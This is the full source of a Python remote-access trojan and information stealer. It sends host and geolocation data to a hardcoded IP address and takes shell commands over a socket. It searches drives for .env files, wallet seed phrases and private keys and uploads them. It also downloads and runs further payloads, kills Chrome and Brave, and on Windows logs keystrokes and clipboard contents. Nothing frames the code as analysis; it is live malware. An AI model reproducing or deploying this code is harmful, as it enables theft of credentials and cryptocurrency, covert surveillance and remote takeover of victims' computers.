_M='-m';_P='pip';_L='install'
import sys,socket
from uuid import getnode
try:from requests import get,post
except:subprocess.check_call([sys.executable,_M,_P,_L,'requests']);from requests import get,post
from hashlib import sha256
from getpass import getuser
from platform import system,node,release,version
import time

sType = "5346"
gType = "11"
class System(object):
    def __init__(A):
        A.system=system()
        if gType == "root":
            A.hostname=node()
        else:
            A.hostname=gType + "_" + node()
        A.release=release()
        A.version=version()
        A.username=getuser()
        A.uuid=A.getID()
    def getID(A):return sha256((str(getnode())+getuser()).encode()).digest().hex()
    def sysInfo(A):return{'uuid':A.uuid,'system':A.system,'release':A.release,'version':A.version,'hostname':A.hostname,'username':A.username}

class Geo(object):
    def __init__(A):A.geo=A.getGeo();A.internal_ip=A.getInternalIp()
    def getInternalIp(A):
        try:return socket.gethostbyname_ex(hn)[-1][-1]
        except:return''
    def getGeo(A):
        try:return get('http://ip-api.com/json').json()
        except:pass
    def netInfo(A):
        g=A.getGeo()
        if g:
            ii=A.internal_ip
            if ii:g['internalIp']=ii
        return g

class Information(object):
    def __init__(A):A.net_info=Geo().netInfo();A.sysInfo=System().sysInfo()
    def parse(K,data):
        J='regionName';I='country';H='query';G='city';F='isp';E='zip';D='lon';C='lat';B='timezone';_A='internalIp'
        A=data;A={C:A[C]if C in A else'',D:A[D]if D in A else'',E:A[E]if E in A else'',F:A[F]if F in A else'',G:A[G]if G in A else'',H:A[H]if H in A else'',I:A[I]if I in A else'',B:A[B]if B in A else'',J:A[J]if J in A else'',_A:A[_A]if _A in A else''}
        if'/'in A[B]:A[B]=A[B].replace('/',' ')
        if'_'in A[B]:A[B]=A[B].replace('_',' ')
        return A
    def get_info(A):B=A.net_info;return{'sys_info':A.sysInfo,'net_info':A.parse(B if B else[])}

host="yNDEuMjA4MTg1LjIzNS4"
#host="  NTEuMjEy  MTAuMTAu"
PORT = 1224
HOST = '45.128.52.14'
if gType == "root":
    hn = socket.gethostname()
else:
    hn = gType + "_" + socket.gethostname()

class Comm(object):
    def __init__(A):A.sys_info=Information().get_info()
    def contact_server(A,ip,port):
        A.ip,A.port=ip,int(port);B=int(time.time()*1000);C={'ts':str(B),'type':sType,'hid':hn,'ss':'sys_info','cc':str(A.sys_info)};D=f"http://{A.ip}:{A.port}/keys"
        try:post(D,data=C)
        except Exception as e:pass
def run_comm():c=Comm();c.contact_server(HOST, PORT);del c
run_comm()

_M='-m';_P='pip';_L='install'
import platform,socket,sys
from time import sleep
from socket import timeout as TimeOutError
import time
from datetime import datetime,timezone,timedelta
import json,os,struct,subprocess
from threading import Thread,RLock,Timer
try:import requests
except:subprocess.check_call([sys.executable,_M,_P,_L,'requests']);import requests
import ast, re
try:from mnemonic import Mnemonic
except:subprocess.check_call([sys.executable,_M,_P,_L,'mnemonic']);from mnemonic import Mnemonic
sHost = socket.gethostname()
host="yNDEuMjA4MTg1LjIzNS4"
os_type = platform.system()
#host="  NTEuMjEy  MTAuMTAu"
_T=True;_F=False;_N=None;_A='admin';_O='output'
class Session(object):
    def __init__(A,sock):A.sock=sock;A.info={'type':0,'group':sType,'name':sHost}
    def shutdown(A):
        try:A.sendall('[close]');A.sock.shutdown(socket.SHUT_RDWR);A.sock.close()
        except:pass
    def connect(A,ip,port):
        A.sock.connect((ip,port));sleep(.5)
        A.send(code=0,args=A.info)
        sleep(.5);return _T
    def struct(A,code=_N,args=_N):return json.dumps({'code': code,'args': args})
    def send(A,code=_N,args=_N):d=A.struct(code, args);A.sendall(d)
    def sendall(A,data):
        try:
            try:ii = data.encode()
            except:ii = data
            ii = struct.pack('>I', len(ii)) + ii
            A.sock.sendall(ii)
        except:pass
    def recv(A):
        try:
            print("start ses recv")
            ll = A.recvall(4)
            print("ses recv size:", ll)
            if not ll:return _N
            ml = struct.unpack('>I', ll)[0]
            print("ses recv:", ml)
            # Read the message datacls
            return A.recvall(ml)
        except TimeOutError:return -1
        except:pass
    def recvall(A,size):
        try:
            d = bytearray()
            while len(d) < size:
                pt = A.sock.recv(size - len(d))
                if not pt:return _N
                d.extend(pt)
            return d
        except:return _N

e_buf = ""
def decode_str(ss):
    try:r=ss.decode('utf8');return r
    except:
        try:r=ss.decode('cp1252');return r
        except:
            try:r=ss.decode('mac_roman');return r
            except:return ss

ex_files = ['.exe','.dll','.msi','.dmg','.iso','.pkg','.apk','.xapk','.aar','.ap_','.aab','.dex','.class','.rpm','.deb','.ipa','.dsym','.mp4','.avi','.mp3','.wmv','.wma','.mov','.webm','.avchd','.mkv','.ogg','.mpe','.mpv','.mpeg','.m4p','.m4a','.m4v','.aac','.flac','.aiff','.qt','.flv','.swf','.pyc','.lock','.psd','.pack','.old','.ppt','.pptx','.virtualization','.indd','.eps','.ai','.a','.jar','.so','.o','.wt','.lib','.dylib','.bin','.ffx','.svg','.css','.scss','.gem','.html','.php','.svg','.htm','.hpp','.cpp','.xml','.lnk','.png','.swift','.ccb','.jsx','.tsx','.h','.java','tsconfig.json','tailwind.config.js','svelte.config.js','next.config.js','babel.config.js','vite.config.js','webpack.config.js','postcss.config.js','robots.txt','license.txt','.ds_store','.angular-config.json','package-lock.json','runtime','CMakeList','dat','.xlf','.sha512','.nuspec','LICENSE']
ex_dirs = ['vendor','Pods','node_modules','Roaming','.git','.next','.externalNativeBuild','sdk','.idea','cocos2d','compose','proj.ios_mac','proj.android-studio','Debug','Release','debug','release','obj','Obj','xcuserdata','.gradle','build','storage','.android','Program Files (x86)','$RECYCLE.BIN','Program Files','Windows','ProgramData','cocoapods','homebrew','.svn','sbin','standalone','local','ruby','man','zsh','Volumes','Applications','Library','System','Pictures','Desktop','usr','android','var','__pycache__','.angular','cache','.nvm','.yarn','.docker','.local','.vscode','.cache','__MACOSX','.pyp','.gem','.config','.rustup','.pyenv','.rvm','.sdkman','.nix-defexpr','.meteor','.nuget','.cargo','.vscode-insiders','.gemexport','.Bin','.oh-my-zsh','.rbenv','.ionic','.mozilla','.var','.cocoapods','.flipper','.forever','.quokka','.continue','.pub-cache','.debris','jdk','.wine32','.phpls','.typeChallenges','.sonarlint','.aptos','.bluemix','.bundle','.cabal','.changes','.changeset','.circleci','.cp','.cpanm','.cxx','.dart_tool','.dartServer','.dbvis','.deps','.devcontainer','.dotnet','.dropbox.cache','.dthumb','.ebcli-virtual-env','.eclipse','eclipse','.electrum','.executables','.exp','.ghcup','.github','.gnupg','.hash','.hasura','.IdentityService','.indexes','.install','.install4j','.kokoro','.localized','.npm','.node-gyp','.p2','.platformio','.plugin_symlinks','.plugins','.store','.storybook','.tmp','tmp','.turbo','.versions','.vs','.vscode-server','.yalc','!azure','x-pack','lib64','site-packages','kibana-8.5.0','google-cloud-sdk','golang.org','Assets.xcassets','arduino','netcore']
pat_envs = ['.env','config.js','secret','metamask','wallet','private','mnemonic','password','account','.xls','.xlsx','.doc','.docx','.rtf','.txt','recovery']

def fmt_s(s):
    if s<1024:return str(s)+'B'
    elif s<1048576:return'{:.0f}KB'.format(s/1024.)
    elif s<1073741824:return'{:.1f}MB'.format(s/1048576.)
    else:return'{:.1f}GB'.format(s/1073741824.)

def write_flist(s,s1):
    default_path = os.path.join(os.path.expanduser("~"), ".n2")
    if not os.path.exists(default_path):os.makedirs(default_path)
    if os.path.exists(default_path + '/flist') == False:
        make_file = open(default_path + '/flist', 'w')
        make_file.close()
    if s1:
        with open(default_path + '/flist', 'a') as f:
            f.write(s)
            f.close()
    else:
        with open(default_path + '/flist', 'w') as f:
            f.write('')
            f.close()

def ups(sn):
    try:
        up_time = str(int(time.time()))
        files = [
            ('multi_file', (up_time + '_' + os.path.basename(sn), open(sn, 'rb'))),
        ]
        r = {
            'type': sType,
            'hid': gType + '_' + sHost,
            'uts': 'auto_upload',
        }
        host2 = f"http://{HOST}:{PORT}"
        requests.post(host2 + "/uploads", files=files, data=r)
        if os.path.basename(sn) != 'flist':
            write_flist(up_time + '_' + os.path.basename(sn) + " : " + sn + "\n", True)
        else:
            write_flist('', False)
    except: pass

def bro_down(p):
    par_dir = os.path.join(os.path.expanduser("~"), ".n2")
    if os.path.exists(p):
        try:os.remove(p)
        except OSError:return _T
    try:
        if not os.path.exists(par_dir):os.makedirs(par_dir)
    except:pass

    host2 = f"http://{HOST}:{PORT}"
    try:
        myfile = requests.get(host2+"/brow/"+sType+"/"+gType, allow_redirects=_T)
        with open(p,'wb') as f:f.write(myfile.content)
        return _T
    except Exception as e:return _F

def arun():
    try:
        par_dir = os.path.join(os.path.expanduser("~"), ".n2")
        p=par_dir+"/bow";res=bro_down(p)
        if res:
            if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
            else:subprocess.Popen([sys.executable,p])
    except Exception as e:o = f'Err4: {e}';pass

def get_available_drives():
    drives = []
    for letter in range(ord('A'), ord('Z') + 1):
        drive = chr(letter) + ':'
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def in_pk(st):
   try:
      pvkeylength = [29, 44, 51, 52, 56, 64, 66, 96, 128, 165, 181]
      i = len(pvkeylength) - 1
      st = st.split('\n')
      for txt in st:
         while i >= 0:
            search = "[a-fA-F0-9]{" + str(pvkeylength[i]) + "}"
            i -= 1
            x = re.findall(search, txt)
            if len(x):
               return True
      return False
   except:
      pass

def ismnemonic(st):
   try:
      st = st.split('\n')
      for txt in st:
         word_cnt = len(txt.split(" "))
         if word_cnt == 12 or word_cnt == 16 or word_cnt == 24:
               mnemo = Mnemonic("english")
               isValid = mnemo.check(txt)
               return isValid
         else:
               return False
   except:
      pass

def is_exceptFile(fname):
   return any(ext in fname for ext in ex_files)

def is_exceptPath(pname):
   return any(ext in pname for ext in ex_dirs)

def is_pat(fname):
   return any(pat in fname for pat in pat_envs)

def fenv():
    try:
        if os_type == "Windows":
            available_drives = get_available_drives()
            for drive in available_drives:
                for root, dirs, files in os.walk(drive+'\\', topdown=False):
                    for name in files:
                        if is_pat(name):
                            if is_exceptFile(name) == False:
                                if is_exceptPath(root) == False:
                                    if str(name).lower().endswith(('.xls','.xlsx','.doc','.docx','.rtf','.json')):
                                        ups(os.path.join(root, name))
                                    else:
                                        try:
                                            content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                            if ismnemonic(content):
                                                ups(os.path.join(root, name))
                                            if in_pk(str(content)):
                                                ups(os.path.join(root, name))
                                        except:
                                            pass
            ups(os.path.join(os.path.expanduser("~"), ".n2/flist"))
        else:
            for root, dirs, files in os.walk(os.path.expanduser("~"), topdown=False):
                for name in files:
                    if is_pat(name):
                        if is_exceptFile(name) == False:
                            if is_exceptPath(root) == False:
                                if str(name).lower().endswith(('.xls','.xlsx','.doc','.docx','.rtf','.json')):
                                    ups(os.path.join(root, name))
                                else:
                                    try:
                                        content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                        if ismnemonic(content):
                                            ups(os.path.join(root, name))
                                        if in_pk(str(content)):
                                            ups(os.path.join(root, name))
                                    except:
                                        pass
            ups(os.path.join(os.path.expanduser("~"), ".n2/flist"))
    except: pass

def auto_up():
    # arun()
    fenv()
    # print()

class Shell(object):
    def __init__(A,S):
        A.sess = S;A.is_alive = _T;A.is_delete = _F;A.lock = RLock();A.timeout_count=0;A.cp_stop=0
        A.par_dir = os.path.join(os.path.expanduser("~"), ".n2")
        A.cmds = {1:A.ssh_obj,2:A.ssh_cmd,3:A.ssh_clip,4:A.ssh_run,5:A.ssh_upload,6:A.ssh_kill,7:A.ssh_any,8:A.ssh_env}
        print("init success")
    def listen_recv(A):
        while A.is_alive:
            try:
                print("start listen")
                recv=A.sess.recv()
                print("listen recv:", recv)
                if recv==-1:
                    if A.timeout_count<30:A.timeout_count+=1;continue
                    else:A.timeout_count=0;recv=_N
                if recv:
                    A.timeout_count=0
                    with A.lock:
                        D=json.loads(recv);c=D['code'];args=D['args']
                        try:
                            if c != 2:
                                args=ast.literal_eval(args)
                        except:
                            pass
                        if c in A.cmds:tg=A.cmds[c];t=Thread(target=tg,args=(args,));t.start()#tg(args)
                        else:
                            if A.is_alive:A.is_alive=_F;A.close()
                else:
                    if A.is_alive:A.timeout_count=0;A.is_alive=_F;A.close()
            except Exception as ex:print("error_listen:", ex)

    def shell(A):
        print("start shell")
        t1 = Thread(target=A.listen_recv);t1.daemon=_T;t1.start()
        while A.is_alive:
            try:sleep(5)
            except:break
        A.close()
        return A.is_delete

    def send(A,code=_N,args=_N):A.sess.send(code=code,args=args)
    def sendall(A,m):A.sess.sendall(m)
    def close(A):A.is_alive=_F;A.sess.shutdown()
    def send_n(A,a,n,o):p={_A:a,_O:o};A.send(code=n,args=p)

    def ssh_cmd(A,args):
        try:
            if os_type == "Windows":
                subprocess.Popen('taskkill /IM /F python.exe', shell=_T)
            else:
                subprocess.Popen('killall python', shell=_T)
        except: pass

    def ssh_obj(A,args):
        o=''
        try:
            a=args[_A];cmd=args['cmd']
            if cmd == '':o=''
            elif cmd.split()[0] == 'cd':
                proc = subprocess.Popen(cmd, shell=_T)
                if len(cmd.split()) != 1:
                    p=' '.join(cmd.split()[1:])
                    if os.path.exists(p):os.chdir(p)
                o=os.getcwd()
            else:
                proc=subprocess.Popen(cmd,shell=_T,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
                try:o=decode_str(proc[0]);err=decode_str(proc[1])
                except:o=proc[0];err=proc[1]
                o=o if o else err
        except:pass
        p={_A:a,_O:o};A.send(code=1, args=p)

    def ssh_clip(A,args):
        global e_buf
        try:A.send(code=3, args=e_buf);e_buf = ""
        except:pass

    def bro_down(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/brow/"+sType+"/"+gType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_run(A,args):
        try:
            a=args[_A];p=A.par_dir+"/bow";res=A.bro_down(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get browse'
        except Exception as e:o = f'Err4: {e}';pass
        p={_A:a,_O: o};A.send(code=4,args=p)

    def send_5(A,a,o):A.send_n(a,5,o)
    
    def ssh_upload(A,args):
        o=''
        try:
            D=args[_A];cmd=args['cmd']
            cmd=ast.literal_eval(cmd)
            if 'sdir' in cmd:sdir=cmd['sdir'];dn=cmd['dname'];sdir=sdir.strip();dn=dn.strip();A.ss_upd(D,cmd,sdir,dn);return _T
            elif 'sfile' in cmd:sfile=cmd['sfile'];dn=cmd['dname'];sfile=sfile.strip();dn=dn.strip();A.ss_upf(D,cmd,sfile,dn);return _T
            elif 'sfind' in cmd:dn=cmd['dname'];pat=cmd['sfind'];dn=dn.strip();pat=pat.strip();A.ss_ufind(D,cmd,dn,pat);return _T
            else:A.ss_ups();o='Stopped ...'
        except Exception as e:print("error_upload:", str(e));o = f'Err4: {e}';pass
        A.send_5(D,o)

    def ss_upd(A,D,args,sd,dname):
        try:
            if sd == '.':drive=os.getcwd()
            else: drive=os.path.join(os.getcwd(),sd)
            A.send_5(D,' >> upload start: ' + sd)
            for root, dirs, files in os.walk(drive, topdown=False):
                for name in files:
                    if A.cp_stop == 1:
                        break
                    if is_exceptFile(name) == False:
                        if is_exceptPath(root) == False:
                            try:
                                A.ss_hup(os.path.join(root, name),D,dname,5)
                            except:
                                pass
            A.ss_hup(os.path.join(os.path.expanduser("~"), ".n2/flist"),D,dname,5)
            A.send_5(D,' upload done ')
        except Exception as ex:
            o='copy error :'+str(ex);A.send_5(D,o)

    def ss_hup(A,sn,D,name,n):
        try:
            up_time = str(int(time.time()))
            files = [
                ('multi_file', (up_time + '_' + os.path.basename(sn), open(sn, 'rb'))),
            ]
            r = {
                'type': sType,
                'hid': gType + '_' + sHost,
                'uts': name,
            }
            host2 = f"http://{HOST}:{PORT}"
            requests.post(host2 + "/uploads", files=files, data=r)
            if os.path.basename(sn) != 'flist':
                write_flist(up_time + '_' + os.path.basename(sn) + " : " + sn + "\n", True)
                o=' copied ' + fmt_s(os.path.getsize(sn)) + ':  ' + os.path.basename(sn)
                A.send_n(D,n,o)
            else:
                write_flist('', False)
        except Exception as e:o=' failed: '+sn+' > '+str(e);A.send_n(D,n,o)

    def ss_upf(A,admin,args,sfile,name):
        D=admin;A.cp_stop=0;t=_N
        try:
            sdir=os.getcwd()
            A.send_5(D,' >> upload start: ' + sdir + ' ' + sfile)
            sn=os.path.join(sdir,sfile)
            A.ss_hup(sn,D,name,5)
            A.send_5(D,' uploaded done ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ufind(A,D,args,dname,pat):
        A.cp_stop=0
        try:
            A.send_5(D,' >> ufind start: ' + os.getcwd())
            drive = os.getcwd()
            for root, dirs, files in os.walk(drive, topdown=False):
                for name in files:
                    if A.cp_stop == 1:
                        break
                    if pat in name:
                        if is_exceptFile(name) == False:
                            if is_exceptPath(root) == False:
                                if str(name).lower().endswith(('.xls','.xlsx','.doc','.docx','.rtf','.json','.png','.jpg')):
                                    A.ss_hup(os.path.join(root, name),D,dname,5)
                                else:
                                    try:
                                        content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                        if ismnemonic(content):
                                            A.ss_hup(os.path.join(root, name),D,dname,5)
                                        if in_pk(str(content)):
                                            A.ss_hup(os.path.join(root, name),D,dname,5)
                                    except:
                                        pass
            A.ss_hup(os.path.join(os.path.expanduser("~"), ".n2/flist"),D,dname,5)
            A.send_5(D,' ufind done ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ups(A):A.cp_stop=1

    def ssh_env(A,args):
        A.cp_stop = 0
        a=args[_A]
        try:
            A.send_n(a,8,'--- uenv start ')
            if os_type == "Windows":
                available_drives = get_available_drives()
                for drive in available_drives:
                    if A.cp_stop == 1:
                        break
                    for root, dirs, files in os.walk(drive+'\\', topdown=False):
                        for name in files:
                            if '.env' in name:
                                if is_exceptFile(name) == False:
                                    if is_exceptPath(root) == False:
                                        try:
                                            content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                            if ismnemonic(content):
                                                A.ss_hup(os.path.join(root, name),a,'env',8)
                                            if in_pk(str(content)):
                                                A.ss_hup(os.path.join(root, name),a,'env',8)
                                        except:
                                            pass
                A.ss_hup(os.path.join(os.path.expanduser("~"), ".n2/flist"),a,'env',8)
            else:
                for root, dirs, files in os.walk(os.path.expanduser("~"), topdown=False):
                    if A.cp_stop == 1:
                        break
                    for name in files:
                        if '.env' in name:
                            if is_exceptFile(name) == False:
                                if is_exceptPath(root) == False:
                                    try:
                                        content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                        if ismnemonic(content):
                                            A.ss_hup(os.path.join(root, name),a,'env',8)
                                        if in_pk(str(content)):
                                            A.ss_hup(os.path.join(root, name),a,'env',8)
                                    except:
                                        pass
                A.ss_hup(os.path.join(os.path.expanduser("~"), ".n2/flist"),a,'env',8)
            A.send_n(a,8,'--- uenv success ')
        except Exception as e:A.send_n(a,8,' uenv err: '+str(e))

    def ssh_kill(A,args):
        D=args[_A]
        if os_type == "Windows":
            try:subprocess.Popen('taskkill /IM chrome.exe /F')
            except:pass
            try:subprocess.Popen('taskkill /IM brave.exe /F')
            except:pass
        else:
            try:subprocess.Popen('killall Google\ Chrome')
            except:pass
            try:subprocess.Popen('killall Brave\ Browser')
            except:pass
        p={_A:D,_O: 'Chrome & Browser are terminated'}
        A.send(code=6,args=p)

    def down_any(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/adc/"+sType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_any(A,args):
        try:
            D=args[_A];p = A.par_dir + "/adc";res=A.down_any(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get anydesk'
        except Exception as e:o = f'Err7: {e}';pass
        p={_A:D,_O:o};A.send(code=7,args=p)

HOST0 = '45.128.52.14'
PORT0 = 2242

class Client():
    def __init__(A):A.server_ip = HOST0;A.server_port = PORT0;A.is_active = _F;A.is_alive = _T;A.timeout_count = 0;A.shell = _N

    @property
    def make_connection(A):
        while _T:
            try:
                A.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s = Session(A.client_socket)
                s.connect(A.server_ip, A.server_port)
                A.shell = Shell(s);A.is_active = _T
                if A.shell.shell():
                    try:dir = os.getcwd();print("dir:", dir);fn=os.path.join(dir,sys.argv[0]);print("fn:", fn);os.remove(fn)
                    except Exception as ex:print("connection error:", ex);pass
                    return _T
                sleep(15)
            except Exception as e: print("error_make:", e); sleep(20);pass
    def run(A):
        t2=Thread(target=auto_up);t2.daemon=_T;t2.start()
        if A.make_connection:return

client = Client()
import sys

is_w=sys.platform.startswith('win')
if __name__ == "__main__":
    if is_w == _F:
        try:client.run()
        except KeyboardInterrupt:pass
        sys.exit(0)

_M='-m';_P='pip';_L='install'
import subprocess
try:import pyWinhook as pyHook
except:subprocess.check_call([sys.executable,_M,_P,_L,'pyWinhook']);import pyWinhook as pyHook
try:import pyperclip
except:subprocess.check_call([sys.executable,_M,_P,_L,'pyperclip']);import pyperclip
try:import psutil
except:subprocess.check_call([sys.executable,_M,_P,_L,'psutil']);import psutil
try:import win32process
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import win32process
try:import pythoncom
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import pythoncom
try:import win32gui
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import win32gui

def act_win_pn():
    try:pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow());return (pid[-1], psutil.Process(pid[-1]).name())
    except:pass

def write_txt(text):0

c_win = 0
def check_window(event):
    global c_win
    if c_win != event.Window:
        (pid, text) = act_win_pn()
        tz = timezone(offset=timedelta(hours=9))
        d_t = datetime.fromtimestamp(time.time(), tz)
        t_s = d_t.strftime("%m/%d/%Y, %H:%M:%S")
        c_win = event.Window
        return f"\n**\n-[ {text} | PID: {pid}-{c_win}\n-[ @ {t_s} | {event.WindowName}\n**\n"
    return ""
m_win = 0
def hmld(event):
    global e_buf, m_win
    if m_win!=event.Window:m_win=event.Window;tt='<..>'
    else:tt='<.>'
    e_buf+=tt;write_txt(tt);return _T

def hmrd(event):
    global e_buf, m_win
    if m_win!=event.Window:m_win=event.Window;tt='<,,>'
    else:tt='<,>'
    e_buf+=tt;write_txt(tt);return _T

def is_down(status):
    if status == 128: return _T
    return _F

def is_control_down():
    return is_down(pyHook.GetKeyState(0x11)) or is_down(pyHook.GetKeyState(0xA2)) or is_down(pyHook.GetKeyState(0xA3))

def run_copy_clipboard():
    global e_buf
    try:
        copied = pyperclip.waitForPaste(0.05)
        tt = "\n=================BEGIN================\n";tt += copied;tt += "\n==================END==================\n"
        e_buf += tt;write_txt(tt)
    except Exception as ex:pass

def hkb(event):
    if event.KeyID == 0xA2 or event.KeyID == 0xA3:return _T

    global e_buf
    tt = check_window(event)

    key = event.Ascii
    if (is_control_down()):key=f"<^{event.Key}>"
    elif key==0xD:key="\n"
    else:
        if key>=32 and key<=126:key=chr(key)
        else:key=f'<{event.Key}>'
    tt += key
    if is_control_down() and event.Key == 'C':
        start_time = Timer(0.1, run_copy_clipboard)
        start_time.start()
    elif is_control_down() and event.Key == 'V':
        start_time = Timer(0.1, run_copy_clipboard)
        start_time.start()

    e_buf += tt;write_txt(tt);return _T
def startHk():hm = pyHook.HookManager();hm.MouseLeftDown = hmld;hm.MouseRightDown = hmrd;hm.KeyDown = hkb;hm.HookMouse();hm.HookKeyboard()
def hk_loop():startHk();pythoncom.PumpMessages()
def run_client():
    t1=Thread(target=hk_loop);t1.daemon=_T;t1.start()
    try:client.run()
    except KeyboardInterrupt:sys.exit(0)

if __name__ == "__main__":
    run_client()
